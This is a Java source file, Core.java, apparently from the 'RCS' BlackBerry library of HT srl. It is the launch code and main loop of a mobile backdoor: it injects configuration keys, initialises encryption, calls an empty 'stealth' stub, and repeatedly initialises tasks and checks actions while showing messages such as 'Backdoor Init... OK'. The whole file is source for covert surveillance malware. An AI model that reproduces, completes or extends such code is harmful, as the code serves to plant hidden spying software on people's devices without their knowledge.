/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Core.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry;

import com.ht.rcs.blackberry.config.InstanceKeys323;
import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.crypto.Encryption;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

/**
 * Classe Core, contiene il main.
 */
public class Core {

    /** The debug instance. */
    private static Debug debug;

    /**
     * Lib main.
     * 
     * @param args
     *            the args
     */
    public static void libMain(final String[] args) {
        Utils.sleep(5000);

        //#debug
        debug = new Debug("Core", DebugLevel.VERBOSE);
        // #debug
        debug.init(false, true, false);
         //#debug
        debug.trace("RCSBlackBerry launching");

        boolean antennaInstalled = true;
        // #if 1=0
        // @ antennaInstalled = false;
        // #endif
        // #debug
        debug.trace("Antenna: " + antennaInstalled);

        if (!Keys.hasBeenBinaryPatched()) {
            // #debug
            debug.warn("Not binary patched, injecting 323");
            InstanceKeys323.injectKeys323();
        }

        Encryption.init();
        
        Core core = new Core();
        boolean ret = core.run();

        // #debug
        debug.trace("RCSBlackBerry exit, return " + ret);
    }

    /** The task obj. */
    private Task taskObj = new Task();

    /**
     * Run.
     * 
     * @return true, if successful
     */
    public final boolean run() {

        stealth();

        Utils.sleep(500);

        for (;;) {
            // #debug
            debug.info("init task");
            if (taskObj.taskInit() == false) {
                // #debug
                debug.error("TaskInit() FAILED");
                Msg.demo("Backdoor Init... FAILED");
                Msg.show();
                return false;
            } else {
                 //#debug
                debug.trace("TaskInit() OK");
                // CHECK: Status o init?
                Msg.demo("Backdoor Init... OK");
                Msg.show();
            }

            //TODO togliere
            // debug.warn("TRIGGERING ACTION 0");
            //Status.getInstance().triggerAction(0);
            
            // #debug
            debug.info("starting checking actions");
            if (taskObj.checkActions() == false) {
                // #debug
                debug.error("CheckActions() [Uninstalling?] FAILED");
                // chiudere tutti i thread
                // decidere se e' un uninstall
                Msg.demo("Backdoor Uninstalled, reboot the device");
                return false;
            }
        }
    }

    /**
     * Stealth.
     */
    private void stealth() {
        // TODO Auto-generated method stub

    }
}
